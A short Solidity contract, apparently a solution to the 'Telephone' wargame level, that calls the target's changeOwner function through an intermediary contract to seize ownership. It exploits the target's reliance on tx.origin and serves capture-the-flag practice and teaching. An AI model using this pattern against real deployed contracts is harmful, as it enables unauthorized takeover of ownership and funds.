// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
  function attack(address _telephoneAddr, address _owner) public {
    Telephone(_telephoneAddr).changeOwner(_owner);
  }
}